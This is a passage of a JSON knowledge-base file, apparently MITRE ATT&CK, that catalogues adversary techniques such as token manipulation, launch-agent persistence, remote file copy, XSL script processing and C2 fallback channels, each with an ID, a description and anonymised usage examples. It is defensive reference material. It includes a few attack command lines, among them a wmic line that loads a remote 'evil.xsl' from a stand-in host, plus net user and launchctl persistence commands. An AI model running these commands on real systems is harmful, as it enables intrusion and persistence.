can also create tokens. (Citation: Cobalt Strike Access Token)",
    "example_uses": [
      "grabs a user token using WTSQueryUserToken and then creates a process by impersonating a logged-on user.",
      "uses token manipulation with NtFilterToken as part of UAC bypass.",
      "Invoke-TokenManipulation Exfiltration module can be used to locate and impersonate user logon tokens.",
      "creates a backdoor through which remote attackers can adjust token privileges.",
      "can obtain a list of SIDs and provide the option for selecting process tokens to impersonate.",
      "has used CVE-2015-1701 to access the SYSTEM token and copy it into the current process as part of privilege escalation.",
      "can steal access tokens from exiting processes and make tokens from known credentials.",
      "keylogger KiloAlfa obtains user tokens from interactive sessions to execute itself with API call CreateProcessAsUserA under that user's context.",
      "examines running system processes for tokens that have specific system privileges. If it finds one, it will copy the token and store it for later use. Eventually it will start new processes with the stored token attached. It can also steal tokens to acquire administrative privileges.",
      "contains a feature to manipulate process privileges and tokens."
    ],
    "id": "T1134",
    "name": "Access Token Manipulation",
    "similar_words": [
      "Access Token Manipulation"
    ]
  },
  "attack-pattern--dce31a00-1e90-4655-b0f9-e2e71a748a87": {
    "description": "The Windows Time service (W32Time) enables time synchronization across and within domains. (Citation: Microsoft W32Time Feb 2018) W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients. (Citation: Microsoft TimeProvider)\n\nTime providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of  HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\. (Citation: Microsoft TimeProvider) The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed. (Citation: Microsoft TimeProvider)\n\nAdversaries may abuse this architecture to establish Persistence, specifically by registering and enabling a malicious DLL as a time provider. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account. (Citation: Github W32Time Oct 2017)",
    "example_uses": [],
    "id": "T1209",
    "name": "Time Providers",
    "similar_words": [
      "Time Providers"
    ]
  },
  "attack-pattern--dd43c543-bb85-4a6f-aa6e-160d90d06a49": {
    "description": "Use of two- or multifactor authentication is recommended and provides a higher level of security than user names and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms. Adversaries may target authentication mechanisms, such as smart cards, to gain access to systems, services, and network resources.\n\nIf a smart card is used for two-factor authentication (2FA), then a keylogger will need to be used to obtain the password associated with a smart card during normal use. With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token. (Citation: Mandiant M Trends 2011)\n\nAdversaries may also employ a keylogger to similarly target other hardware tokens, such as RSA SecurID. Capturing token input (including a user's personal identification code) may provide temporary access (i.e. replay the one-time passcode until the next value rollover) as well as possibly enabling adversaries to reliably predict future authentication values (given access to both the algorithm and any seed values used to generate appended temporary codes). (Citation: GCN RSA June 2011)\n\nOther methods of 2FA may be intercepted and used by an adversary to authenticate. It is common for one-time codes to be sent via out-of-band communications (email, SMS). If the device and/or service is not secured, then it may be vulnerable to interception. Although primarily focused on by cyber criminals, these authentication mechanisms have been targeted by advanced actors. (Citation: Operation Emmental)",
    "example_uses": [
      "is known to contain functionality that enables targeting of smart card technologies to proxy authentication for connections to restricted network resources using detected hardware tokens."
    ],
    "id": "T1111",
    "name": "Two-Factor Authentication Interception",
    "similar_words": [
      "Two-Factor Authentication Interception"
    ]
  },
  "attack-pattern--dd901512-6e37-4155-943b-453e3777b125": {
    "description": "Per Apple’s developer documentation, when a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (plist) files found in /System/Library/LaunchAgents, /Library/LaunchAgents, and $HOME/Library/LaunchAgents (Citation: AppleDocs Launch Agent Daemons) (Citation: OSX Keydnap malware) (Citation: Antiquated Mac Malware). These launch agents have property list files which point to the executables that will be launched (Citation: OSX.Dok Malware).\n \nAdversaries may install a new launch agent that can be configured to execute at login by using launchd or launchctl to load a plist into the appropriate directories  (Citation: Sofacy Komplex Trojan)  (Citation: Methods of Mac Malware Persistence). The agent name may be disguised by using a name from a related operating system or benign software. Launch Agents are created with user level privileges and are executed with the privileges of the user when they log in (Citation: OSX Malware Detection) (Citation: OceanLotus for OS X). They can be set up to execute when a specific user logs in (in the specific user’s directory structure) or when any user logs in (which requires administrator privileges).",
    "example_uses": [
      "persists via a Launch Agent.",
      "persists via a Launch Agent.",
      "persists via a Launch Agent.",
      "adds a .plist file to the /Library/LaunchAgents folder to maintain persistence.",
      "creates a Launch Agent on macOS.",
      "persists via a Launch Agent.",
      "uses a Launch Agent to persist.",
      "The  trojan creates a persistent launch agent called with $HOME/Library/LaunchAgents/com.apple.updates.plist with launchctl load -w ~/Library/LaunchAgents/com.apple.updates.plist."
    ],
    "id": "T1159",
    "name": "Launch Agent",
    "similar_words": [
      "Launch Agent"
    ]
  },
  "attack-pattern--e01be9c5-e763-4caf-aeb7-000b416aef67": {
    "description": "Adversaries with a sufficient level of access may create a local system or domain account. Such accounts may be used for persistence that do not require persistent remote access tools to be deployed on the system.\n\nThe net user commands can be used to create a local or domain account.",
    "example_uses": [
      "used a tool called Imecab to set up a persistent remote access account on the victim machine.",
      "can create a Windows account.",
      "created accounts on victims, including administrator accounts, some of which appeared to be tailored to each individual staging target.",
      "has the capability to add its own account to the victim's machine.",
      "can user PowerView to perform “net user” commands and create local system and domain accounts.",
      "has been known to create or enable accounts, such as support_388945a0.",
      "The net user username \\password and net user username \\password \\domain commands in  can be used to create a local or domain account respectively.",
      "can create backdoor accounts with the login \"HelpAssistant\" with the Limbo module.",
      "may create a temporary user on the system named “Lost_{Unique Identifier}.”",
      "may create a temporary user on the system named “Lost_{Unique Identifier}” with the password “pond~!@6”{Unique Identifier}.”"
    ],
    "id": "T1136",
    "name": "Create Account",
    "similar_words": [
      "Create Account"
    ]
  },
  "attack-pattern--e2907cea-4b43-4ed7-a570-0fdf0fbeea00": {
    "description": "Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system. For example, if there is a Mach-O executable file called evil.bin, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to evil.txt, then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to \"evil.txt \" (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed (Citation: Mac Backdoors are back). \n\nAdversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious.",
    "example_uses": [
      "puts a space after a false .jpg extension so that execution actually goes through the Terminal.app program."
    ],
    "id": "T1151",
    "name": "Space after Filename",
    "similar_words": [
      "Space after Filename"
    ]
  },
  "attack-pattern--e358d692-23c0-4a31-9eb6-ecc13a8d7735": {
    "description": "Adversaries will likely attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used. \n\n### Windows\n\nExamples of tools and commands that acquire this information include \"ping\" or \"net view\" using [Net](https://attack.mitre.org/software/S0039).\n\n### Mac\n\nSpecific to Mac, the bonjour protocol to discover additional Mac-based systems within the same broadcast domain. Utilities such as \"ping\" and others can be used to gather information about remote systems.\n\n### Linux\n\nUtilities such as \"ping\" and others can be used to gather information about remote systems.",
    "example_uses": [
      "collects a list of available servers with the command net view.",
      "used Microsoft’s Sysinternals tools to gather detailed information about remote systems.",
      "has used network scanning and enumeration tools, including .",
      "has used the net view command.",
      "has used ping to identify other machines of interest.",
      "likely obtained a list of hosts in the victim environment.",
      "runs the net view /domain and net view commands.",
      "uses the net view command for discovery.",
      "runs the net view command",
      "has the capability to identify remote hosts on connected networks.",
      "uses  and other Active Directory utilities to enumerate hosts.",
      "has a tool that can detect the existence of remote systems.",
      "has used the open source tool Essential NetTools to map the network and build a list of targets.",
      "typically use ping and  to enumerate systems.",
      "performs a connection test to discover remote systems in the network",
      "can be used to identify remote systems within a network.",
      "can ping or traceroute a remote host.",
      "uses scripts to enumerate IP ranges on the victim network.  has also issued the command net view /domain to a  implant to gather information about remote systems on the network.",
      "Commands such as net view can be used in  to gather information about available remote systems.",
      "may use net view /domain to display hostnames of available systems on a network.",
      "has a command to list all servers in the domain, as well as one to locate domain controllers on a domain.",
      "uses the native Windows Network Enumeration APIs to interrogate and discover targets in a Windows Active Directory network.",
      "scans the C-class subnet of the IPs on the victim's interfaces.",
      "used publicly available tools (including Microsoft's built-in SQL querying tool, osql.exe) to map the internal network and conduct reconnaissance against Active Directory, Structured Query Language (SQL) servers, and NetBIOS.",
      "surveys a system upon check-in to discover remote systems on a local network using the net view and net view /DOMAIN commands."
    ],
    "id": "T1018",
    "name": "Remote System Discovery",
    "similar_words": [
      "Remote System Discovery"
    ]
  },
  "attack-pattern--e3a12395-188d-4051-9a16-ea8e14d07b88": {
    "description": "Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation. Methods to acquire this information include port scans and vulnerability scans using tools that are brought onto a system.",
    "example_uses": [
      "scanned network services to search for vulnerabilities in the victim system.",
      "has used the publicly available tool SoftPerfect Network Scanner as well as a custom tool called GOLDIRONY to conduct network scanning.",
      "leveraged an open-source tool called SoftPerfect Network Scanner to perform network scanning.",
      "can scan for open TCP ports on the target network.",
      "has the capability to scan for open ports on hosts in a connected network.",
      "has a built-in module for port scanning.",
      "has used tcping.exe, similar to , to probe port status on systems of interest.",
      "has conducted port scans on a host.",
      "scans to identify open ports on the victim.",
      "can perform port scans from an infected host.",
      "is capable of probing the network for open ports.",
      "has a plugin that can perform ARP scanning as well as port scanning.",
      "the victim's internal network for hosts with ports 8080, 5900, and 40 open.",
      "used publicly available tools (including Microsoft's built-in SQL querying tool, osql.exe) to map the internal network and conduct reconnaissance against Active Directory, Structured Query Language (SQL) servers, and NetBIOS.",
      "actors use the Hunter tool to conduct network service discovery for vulnerable systems."
    ],
    "id": "T1046",
    "name": "Network Service Scanning",
    "similar_words": [
      "Network Service Scanning"
    ]
  },
  "attack-pattern--e6415f09-df0e-48de-9aba-928c902b7549": {
    "description": "In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a physical medium or device introduced by a user. Such media could be an external hard drive, USB drive, cellular phone, MP3 player, or other removable storage and processing device. The physical medium or device could be used as the final exfiltration point or to hop between otherwise disconnected systems.",
    "example_uses": [
      "creates a file named thumb.dd on all USB flash drives connected to the victim. This file contains information about the infected system and activity logs.",
      "contains a module to move data from airgapped networks to Internet-connected systems by using a removable USB device.",
      "copies staged data to removable drives when they are inserted into the system.",
      "exfiltrates collected files via removable media from air-gapped victims."
    ],
    "id": "T1052",
    "name": "Exfiltration Over Physical Medium",
    "similar_words": [
      "Exfiltration Over Physical Medium"
    ]
  },
  "attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add": {
    "description": "Files may be copied from one system to another to stage adversary tools or other files over the course of an operation. Files may be copied from an external adversary-controlled system through the Command and Control channel to bring tools into the victim network or through alternate protocols with another tool such as [FTP](https://attack.mitre.org/software/S0095). Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.\n\nAdversaries may also copy files laterally between internal victim systems to support Lateral Movement with remote Execution using inherent file sharing protocols such as file sharing over SMB to connected network shares or with authenticated connections with [Windows Admin Shares](https://attack.mitre.org/techniques/T1077) or [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1076).",
    "example_uses": [
      "malware can download additional files from C2 servers.",
      "can download remote files onto victims.",
      "has downloaded additional malware, including by using .",
      "can download additional components from the C2 server.",
      "can download files remotely.",
      "downloads a new version of itself once it has installed. It also downloads additional plugins.",
      "can download and execute files.",
      "has a command to download and executes additional files.",
      "has used shellcode to download Meterpreter after compromising a victim.",
      "retrieves additional malicious payloads from the C2 server.",
      "uploads files and secondary payloads to the victim's machine.",
      "can download files from the C2 server to the victim’s machine.",
      "downloads several additional files and saves them to the victim's machine.",
      "downloads additional files from C2 servers.",
      "can download files from its C2 server to the victim's machine.",
      "has the capability to download files to execute on the victim’s machine.",
      "has the capability to upload and download files to the victim's machine.",
      "downloads additional plug-ins to load on the victim’s machine, including the ability to upgrade and replace its own binary.",
      "can download and launch additional payloads.",
      "can download and execute a file from given URL.",
      "has downloaded and executed additional plugins.",
      "can download and upload files to and from the victim’s machine.",
      "can upload and download files to the victim.",
      "can download files to the victim’s machine and execute them.",
      "uploads and downloads information.",
      "uses public sites such as github.com and sendspace.com to upload files and then download them to victim computers.",
      "uploads and downloads files to and from the victim’s machine.",
      "downloads and uploads files to and from the victim’s machine.",
      "can upload files to the victim's machine for operations.",
      "obtains additional code to execute on the victim's machine.",
      "can download and upload files to the victim's machine.",
      "copied and installed tools for operations once in the victim environment.",
      "can upload files to the victim’s machine and can download additional payloads.",
      "can download additional files.",
      "downloads and uploads files on the victim’s machine.",
      "creates a backdoor through which remote attackers can upload files.",
      "can upload and download files to the victim’s machine.",
      "has downloaded second stage malware from compromised websites.",
      "The Ritsol backdoor trojan used by  can download files onto a compromised host from a remote location.",
      "can download files and upgrade itself.",
      "can retrieve and execute additional  payloads from the C2 server.",
      "can download remote files.",
      "can download files onto the victim.",
      "can download additional payloads onto the victim.",
      "downloads additional payloads.",
      "is capable of downloading additional files.",
      "creates a backdoor through which remote attackers can download files.",
      "has transferred files using the Intel® Active Management Technology (AMT) Serial-over-LAN (SOL) channel.",
      "can upload and download files.",
      "can be used to create  to upload and/or download files.",
      "has downloaded additional scripts and files from adversary-controlled servers.  has also used an uploader known as LUNCHMONEY that can exfiltrate files to Dropbox.",
      "has used remote code execution to download subsequent payloads.",
      "can download additional files from URLs.",
      "creates a backdoor through which remote attackers can download files and additional malware components.",
      "can download and execute a second-stage payload.",
      "can upload and download files, including second-stage malware.",
      "creates a backdoor through which remote attackers can download files onto a compromised host.",
      "can download additional files and payloads to compromised hosts.",
      "can upload and download to/from a victim machine.",
      "can download and execute an arbitary executable.",
      "creates a backdoor through which remote attackers can upload files.",
      "downloads files onto infected hosts.",
      "can download files.",
      "creates a backdoor through which remote attackers can download files onto compromised hosts.",
      "can execute a task to download a file.",
      "has downloaded additional code and files from servers onto victims.",
      "has a tool that can copy files to remote machines.",
      "has added JavaScript to victim websites to download additional frameworks that profile and compromise website visitors.",
      "can download remote files.",
      "can download or upload files from its C2 server.",
      "can download files from remote servers.",
      "has used various tools to download files, including DGet (a similar tool to wget).",
      "can download remote files onto victims.",
      "can download additional files.",
      "has a command to download and execute an additional file.",
      "can download remote files and additional payloads to the victim's machine.",
      "copies a file over to the remote system before execution.",
      "is capable of downloading files, including additional modules.",
      "has a command to upload a file to the victim machine.",
      "can download additional files.",
      "can upload, download, and execute files on the victim.",
      "is capable of downloading remote files.",
      "is capable of downloading additional files.",
      "can be used to copy files to a remotely connected system.",
      "has deployed Meterpreter stagers and SplinterRAT instances in the victim network after moving laterally.",
      "is capable of downloading additional files through C2 channels, including a new version of itself.",
      "After downloading its main config file,  downloads multiple payloads from C2 servers.",
      "attempts to download an encrypted binary from a specified domain.",
      "uses the Dropbox API to request two files, one of which is the same file as the one dropped by the malicious email attachment. This is most likely meant to be a mechanism to update the compromised host with a new version of the  malware.",
      "contains a command to retrieve files from its C2 server.",
      "is capable of downloading files from the C2.",
      "has downloaded additional malware to execute on the victim's machine, including by using a PowerShell script to launch shellcode that retrieves an additional payload.",
      "is capable of performing remote file transmission.",
      "has installed updates and new malware on victims.",
      "is capable of writing a file to the compromised system from the C2 server.",
      "has a command to download a file from the C2 server to the victim mobile device's SD card.",
      "can download an executable to run on the victim.",
      "has the capability to download and execute .exe files.",
      "has a command to download a file.",
      "has the capability to download files from the C2 server.",
      "can retrieve an additional payload from its C2 server.",
      "downloads and executes additional malware from either a Web address or a Microsoft OneDrive account.",
      "has the ability to upload and download files from its C2 server.",
      "has been observed being used to download  and the Cobalt Strike Beacon payload onto victims.",
      "downloads and executes additional PowerShell code and Windows binaries.",
      "contains a command to download and execute a file from a remotely hosted URL using WinINet HTTP requests.",
      "can download and execute additional files.",
      "has the ability to download and execute additional files.",
      "is capable of downloading a file from a specified URL.",
      "can download additional encrypted backdoors onto the victim via GIF files.",
      "has a command to download a file to the system from its C2 server.",
      "downloads its backdoor component from a C2 server and loads it directly into memory.",
      "downloads another dropper from its C2 server.",
      "has the capability to download a file to the victim from the C2 server.",
      "can download and execute files.",
      "has the capability to download files.",
      "has the ability to download files.",
      "can be used to download files from a given URL.",
      "contains a network loader to receive executable modules from remote attackers and run them on the local victim. It can also upload and download files over HTTP and HTTPS.",
      "searches for network drives and removable media and duplicates itself onto them.",
      "is capable of uploading and downloading files.",
      "Tools used by  are capable of downloading and executing additional payloads.",
      "payloads download additional files from the C2 server.",
      "Several  malware families are capable of downloading and executing binaries from its C2 server.",
      "After re-establishing access to a victim network,  actors download tools including  and WCE that are staged temporarily on websites that were previously compromised but never used.",
      "has downloaded additional files, including by using a first-stage downloader to contact the C2 server to obtain the second-stage implant."
    ],
    "id": "T1105",
    "name": "Remote File Copy",
    "similar_words": [
      "Remote File Copy"
    ]
  },
  "attack-pattern--e7eab98d-ae11-4491-bd28-a53ba875865a": {
    "description": "Windows shared drive and [Windows Admin Shares](https://attack.mitre.org/techniques/T1077) connections can be removed when no longer needed. [Net](https://attack.mitre.org/software/S0039) is an example utility that can be used to remove network share connections with the net use \\\\system\\share /delete command. (Citation: Technet Net Use)\n\nAdversaries may remove share connections that are no longer useful in order to clean up traces of their operation.",
    "example_uses": [
      "has detached network shares after exfiltrating files, likely to evade detection.",
      "The net use \\\\system\\share /delete command can be used in  to remove an established connection to a network share."
    ],
    "id": "T1126",
    "name": "Network Share Connection Removal",
    "similar_words": [
      "Network Share Connection Removal"
    ]
  },
  "attack-pattern--e906ae4d-1d3a-4675-be23-22f7311c0da4": {
    "description": "Windows Management Instrumentation (WMI) can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system. Adversaries may attempt to evade detection of this technique by compiling WMI scripts. (Citation: Dell WMI Persistence) Examples of events that may be subscribed to are the wall clock time or the computer's uptime. (Citation: Kazanciyan 2014) Several threat groups have reportedly used this technique to maintain persistence. (Citation: Mandiant M-Trends 2015)",
    "example_uses": [
      "has used WMI for persistence.",
      "can use a WMI script to achieve persistence.",
      "uses a WMI event subscription to establish persistence.",
      "uses an event filter in WMI code to execute a previously dropped executable shortly after system startup.",
      "has used WMI event filters to establish persistence."
    ],
    "id": "T1084",
    "name": "Windows Management Instrumentation Event Subscription",
    "similar_words": [
      "Windows Management Instrumentation Event Subscription"
    ]
  },
  "attack-pattern--e99ec083-abdd-48de-ad87-4dbf6f8ba2a4": {
    "description": "Per Apple’s developer documentation, when macOS and OS X boot up, launchd is run to finish system initialization. This process loads the parameters for each launch-on-demand system-level daemon from the property list (plist) files found in /System/Library/LaunchDaemons and /Library/LaunchDaemons (Citation: AppleDocs Launch Agent Daemons). These LaunchDaemons have property list files which point to the executables that will be launched (Citation: Methods of Mac Malware Persistence).\n \nAdversaries may install a new launch daemon that can be configured to execute at startup by using launchd or launchctl to load a plist into the appropriate directories (Citation: OSX Malware Detection). The daemon name may be disguised by using a name from a related operating system or benign software  (Citation: WireLurker). Launch Daemons may be created with administrator privileges, but are executed under root privileges, so an adversary may also use a service to escalate privileges from administrator to root.\n \nThe plist file permissions must be root:wheel, but the script or program that it points to has no such requirement. So, it is possible for poor configurations to allow an adversary to modify a current Launch Daemon’s executable and gain persistence or Privilege Escalation.",
    "example_uses": [],
    "id": "T1160",
    "name": "Launch Daemon",
    "similar_words": [
      "Launch Daemon"
    ]
  },
  "attack-pattern--ebbe170d-aa74-4946-8511-9921243415a3": {
    "description": "Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)\n\nAdversaries may abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses. Similar to [Trusted Developer Utilities](https://attack.mitre.org/techniques/T1127), the Microsoft common line transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018)\n\nCommand-line example: (Citation: Penetration Testing Lab MSXSL July 2017)\n\n* msxsl.exe customers[.]xml script[.]xsl\n\nAnother variation of this technique, dubbed “Squiblytwo”, involves using [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript or VBScript within an XSL file. (Citation: subTee WMIC XSL APR 2018) This technique can also execute local/remote scripts and, similar to its [Regsvr32](https://attack.mitre.org/techniques/T1117)/ \"Squiblydoo\" counterpart, leverages a trusted, built-in Windows tool.\n\nCommand-line examples: (Citation: subTee WMIC XSL APR 2018)\n\n* Local File: wmic process list /FORMAT:evil[.]xsl\n* Remote File: wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”",
    "example_uses": [
      "used msxsl.exe to bypass AppLocker and to invoke Jscript code from an XSL file."
    ],
    "id": "T1220",
    "name": "XSL Script Processing",
    "similar_words": [
      "XSL Script Processing"
    ]
  },
  "attack-pattern--edbe24e9-aec4-4994-ac75-6a6bc7f1ddd0": {
    "description": "Windows Dynamic Data Exchange (DDE) is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.\n\nObject Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by COM, DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys. (Citation: BleepingComputer DDE Disabled in Word Dec 2017) (Citation: Microsoft ADV170021 Dec 2017) (Citation: Microsoft DDE Advisory Nov 2017)\n\nAdversaries may use DDE to execute arbitrary commands. Microsoft Office documents can be poisoned with DDE commands (Citation: SensePost PS DDE May 2016) (Citation: Kettle CSV DDE Aug 2014), directly or through embedded files (Citation: Enigma Reviving DDE Jan 2018), and used to deliver execution via phishing campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros. (Citation: SensePost MacroLess DDE Oct 2017) DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to command line execution.",
    "example_uses": [
      "has sent malicious Word OLE compound documents to victims.",
      "leveraged the DDE protocol to deliver their malware.",
      "has been delivered via Word documents using DDE for execution.",
      "has used Windows DDE for execution of commands and a malicious VBS.",
      "can use DDE to execute additional payloads on compromised hosts.",
      "has delivered  and  by executing PowerShell commands through DDE in Word documents.",
      "spear phishing campaigns have included malicious Word documents with DDE execution."
    ],
    "id": "T1173",
    "name": "Dynamic Data Exchange",
    "similar_words": [
      "Dynamic Data Exchange"
    ]
  },
  "attack-pattern--f24faf46-3b26-4dbb-98f2-63460498e433": {
    "description": "Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.",
    "example_uses": [
      "uses a large list of C2 servers that it cycles through until a successful connection is established.",
      "can accept multiple URLs for C2 servers.",
      "uses multiple protocols (HTTPS, HTTP, DNS) for its C2 server as fallback channels if communication with one is unsuccessful.",
      "creates a backdoor through which remote attackers can change C2 servers.",
      "malware ISMAgent falls back to its DNS tunneling mechanism if it is unable to reach the C2 server over HTTP.",
      "primarily uses port 80 for C2, but falls back to ports 443 or 8080 if initial communication fails.",
      "uses a backup communication method with an HTTP beacon.",
      "can switch to a new C2 channel if the current one is broken.",
      "malware contains a secondary fallback command and control server that is contacted after the primary command and control server.",
      "has two hard-coded domains for C2 servers; if the first does not respond, it will try the second.",
      "has the capability to communicate over a backup channel via plus.google.com.",
      "uses Google Search to identify C2 servers if its primary C2 method via Twitter is not working.",
      "will attempt to detect if the infected host is configured to a proxy. If so,  will send beacons via an HTTP POST request; otherwise it will send beacons via UDP/6000.",
      "has a hard-coded primary and backup C2 string.",
      "The C2 server used by  provides a port number to the victim to use as a fallback in case the connection closes on the currently used port.",
      "tests if it can reach its C2 server by first attempting a direct connection, and if it fails, obtaining proxy settings and sending the connection through a proxy, and finally injecting code into a running browser if the proxy method fails.",
      "first attempts to use a Base64-encoded network protocol over a raw TCP socket for C2, and if that method fails, falls back to a secondary HTTP-based protocol to communicate to an alternate C2 server.",
      "is usually configured with primary and backup domains for C2 communications.",
      "malware SierraAlfa sends data to one of the hard-coded C2 servers chosen at random, and if the transmission fails, chooses a new C2 server to attempt the transmission again."
    ],
    "id": "T1008",
    "name": "Fallback Channels",
    "similar_words": [
      "Fallback Channels"
    ]
  },
  "attack-pattern--f2d44246-91f1-478a-b6c8-1227e0ca109d": {
    "description": "Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition. (Citation: SpectorOps Host-Based Jul 2017) Within MFT entries are file attributes, (Citation: Microsoft NTFS File Attributes Aug 2010) such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files). (Citation: SpectorOps Host-Based Jul 2017) (Citation: Microsoft File Streams) (Citation: MalwareBytes ADS July 2015) (Citation: Microsoft ADS Mar 2014)\n\nAdversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus. (Citation: Journey into IR ZeroAccess NTFS EA) (Citation: MalwareBytes ADS July 2015)",
    "example_uses": [
      "stores configuration items in alternate data streams (ADSs) if the Registry is not accessible.",
      "If the victim is using PowerShell 3.0 or later,  writes its decoded payload to an alternate data stream (ADS) named kernel32.dll that is saved in %PROGRAMDATA%\\Windows\\.",
      "hides many of its backdoor payloads in an alternate data stream (ADS).",
      "The  malware platform uses Extended Attributes to store encrypted executables.",
      "Some variants of the  Trojan have been known to store data in Extended Attributes."
    ],
    "id": "T1096",
    "name": "NTFS File Attributes",
    "similar_words": [
      "NTFS File Attributes"
    ]
  },
  "attack-pattern--f3c544dc-673c-4ef3-accb-53229f1ae077": {
    "description": "The system time is set and stored by the Windows Time Service within a domain to maintain time synchronization between systems and services in an enterprise network. (Citation: MSDN System Time) (Citation: Technet Windows Time Service)\n\nAn adversary may gather the system time and/or time zone from a local or remote system. This information may be gathered in a number of ways, such as with [Net](https://attack.mitre.org/software/S0039) on Windows by performing net time \\\\hostname to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using w32tm /tz. (Citation: Technet Windows Time Service) The information could be useful for performing other techniques, such as executing a file with a [Scheduled Task](https://attack.mitre.org/techniques/T1053) (Citation: RSA EU12 They're Inside), or to discover locality information based on time zone to assist in victim targeting.",
    "example_uses": [
      "has the capability to obtain the time zone information and current timestamp of the victim’s machine.",
      "As part of the data reconnaissance phase,  grabs the system time to send back to the control server.",
      "gathers the local system time from the victim’s machine.",
      "A Destover-like implant used by  can obtain the current system time and send it to the C2 server.",
      "can obtain the date and time of a system.",
      "checks to see if the system is configured with \"Daylight\" time and checks for a specific region to be set for the timezone.",
      "has used net time to check the local time on a target system.",
      "obtains the victim's current time.",
      "obtains the system time and will only activate if it is greater than a preset date.",
      "has commands to get the time the machine was built, the time, and the time zone.",
      "can obtain the victim time zone.",
      "The net time command can be used in  to determine the local or remote system time.",
      "gathers and beacons the system time during installation.",
      "surveys a system upon check-in to discover the system time by using the net time command."
    ],
    "id": "T1124",
    "name": "System Time Discovery",
    "similar_words": [
      "System Time Discovery"
    ]
  },
  "attack-pattern--f44731de-ea9f-406d-9b83-30ecbb9b4392": {
    "description": "Adversaries may execute a binary, command, or script via a method that interacts with Windows services, such as the Service Control Manager. This can be done by either creating a new service or modifying an existing service. This technique is the execution used in conjunction with [New Service](https://attack.mitre.org/techniques/T1050) and [Modify Existing Service](https://attack.mitre.org/techniques/T1031) during service persistence or privilege escalation.",
    "example_uses": [
      "has used a tool known as RemoteExec (similar to ) to remotely execute batch scripts and binaries.",
      "can run a command on another machine using .",
      "launches a DLL file that gets executed as a service using svchost.exe",
      "can execute commands remotely by creating a new service on the remote system.",
      "registers itself as a service on the victim’s machine to run as a standalone process.",
      "uses svchost.exe to execute a malicious DLL included in a new service group.",
      "installs a service on the remote system, executes the command, then uninstalls the service.",
      "uses  to execute a payload or commands on a remote host.",
      "uses services.exe to register a new autostart service named \"Audit Service\" using a copy of the local lsass.exe file.",
      "can start, stop, or delete services.",
      "can use  to execute a payload on a remote host. It can also use Service Control Manager to start new services.",
      "Microsoft Sysinternals  is a popular administration tool that can be used to execute binaries on remote systems using a temporary Windows service.",
      "can be used to execute binaries on remote systems by creating and starting a service.",
      "The net start and net stop commands can be used in  to execute or stop Windows services.",
      "uses  to perform remote service manipulation to execute a copy of itself as part of lateral movement.",
      "creates a new service named “ntssrv” to execute the payload."
    ],
    "id": "T1035",
    "name": "Service Execution",
    "similar_words": [
      "Service Execution"
    ]
  },
  "attack-pattern--f4882e23-8aa7-4b12-b28a-b349c12ee9e0": {
    "description": "PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer. \n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nAdministrator permissions are required to use PowerShell to connect to remote systems.\n\nA number of PowerShell-based offensive testing tools are available, including Empire, (Citation: Github PowerShell Empire) PowerSploit, (Citation: Powersploit) and PSAttack. (Citation: Github PSAttack)",
    "example_uses": [
      "used PowerShell commands to execute payloads.",
      "There is a variant of  that uses a PowerShell script instead of the traditional PE form.",
      "uses PowerShell for execution.",
      "can launch PowerShell Scripts.",
      "leveraged PowerShell to download and execute additional scripts for execution.",
